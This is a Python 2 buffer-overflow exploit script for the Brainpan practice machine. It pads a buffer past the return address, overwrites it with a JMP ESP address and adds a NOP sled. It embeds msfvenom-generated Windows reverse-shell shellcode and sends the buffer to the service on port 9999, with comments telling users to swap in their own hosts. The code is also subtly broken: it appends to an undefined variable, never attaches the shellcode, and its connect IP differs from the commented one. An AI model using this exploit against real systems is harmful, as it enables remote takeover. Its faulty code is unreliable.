#This is the Final Code of Buffer Overflow of the Brainpan. 
#Make sure to change the LHOST , RHOST , LPORT and RPORT according to your IP.
#This script is based on python2

import socket

import sys

#JMP ESP = 311712F3

buff = "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * 20 

#msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=port -f python -a x86 --platform windows -b "\x00"

buf += b"\xbf\xa5\xaa\x61\xca\xda\xcf\xd9\x74\x24\xf4\x5e\x2b"
buf += b"\xc9\xb1\x52\x31\x7e\x12\x03\x7e\x12\x83\x4b\x56\x83"
buf += b"\x3f\x6f\x4f\xc6\xc0\x8f\x90\xa7\x49\x6a\xa1\xe7\x2e"
buf += b"\xff\x92\xd7\x25\xad\x1e\x93\x68\x45\x94\xd1\xa4\x6a"
buf += b"\x1d\x5f\x93\x45\x9e\xcc\xe7\xc4\x1c\x0f\x34\x26\x1c"
buf += b"\xc0\x49\x27\x59\x3d\xa3\x75\x32\x49\x16\x69\x37\x07"
buf += b"\xab\x02\x0b\x89\xab\xf7\xdc\xa8\x9a\xa6\x57\xf3\x3c"
buf += b"\x49\xbb\x8f\x74\x51\xd8\xaa\xcf\xea\x2a\x40\xce\x3a"
buf += b"\x63\xa9\x7d\x03\x4b\x58\x7f\x44\x6c\x83\x0a\xbc\x8e"
buf += b"\x3e\x0d\x7b\xec\xe4\x98\x9f\x56\x6e\x3a\x7b\x66\xa3"
buf += b"\xdd\x08\x64\x08\xa9\x56\x69\x8f\x7e\xed\x95\x04\x81"
buf += b"\x21\x1c\x5e\xa6\xe5\x44\x04\xc7\xbc\x20\xeb\xf8\xde"
buf += b"\x8a\x54\x5d\x95\x27\x80\xec\xf4\x2f\x65\xdd\x06\xb0"
buf += b"\xe1\x56\x75\x82\xae\xcc\x11\xae\x27\xcb\xe6\xd1\x1d"
buf += b"\xab\x78\x2c\x9e\xcc\x51\xeb\xca\x9c\xc9\xda\x72\x77"
buf += b"\x09\xe2\xa6\xd8\x59\x4c\x19\x99\x09\x2c\xc9\x71\x43"
buf += b"\xa3\x36\x61\x6c\x69\x5f\x08\x97\xfa\x6a\xc5\xde\xba"
buf += b"\x02\xd7\xe0\x3e\x01\x5e\x06\x54\xb5\x37\x91\xc1\x2c"
buf += b"\x12\x69\x73\xb0\x88\x14\xb3\x3a\x3f\xe9\x7a\xcb\x4a"
buf += b"\xf9\xeb\x3b\x01\xa3\xba\x44\xbf\xcb\x21\xd6\x24\x0b"
buf += b"\x2f\xcb\xf2\x5c\x78\x3d\x0b\x08\x94\x64\xa5\x2e\x65"
buf += b"\xf0\x8e\xea\xb2\xc1\x11\xf3\x37\x7d\x36\xe3\x81\x7e"
buf += b"\x72\x57\x5e\x29\x2c\x01\x18\x83\x9e\xfb\xf2\x78\x49"
buf += b"\x6b\x82\xb2\x4a\xed\x8b\x9e\x3c\x11\x3d\x77\x79\x2e"
buf += b"\xf2\x1f\x8d\x57\xee\xbf\x72\x82\xaa\xb0\x38\x8e\x9b"
buf += b"\x58\xe5\x5b\x9e\x04\x16\xb6\xdd\x30\x95\x32\x9e\xc6"
buf += b"\x85\x37\x9b\x83\x01\xa4\xd1\x9c\xe7\xca\x46\x9c\x2d"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#RHOST = 192.168.1.14 (Change according to your IP)
#RPORT = 9999 (Change according to your Vulnerable service port)

try:
	s.connect(('192.186.1.14', 9999))
except:
	print "Error"
	sys.exit(0)
s.recv(1024)
s.send(buff)
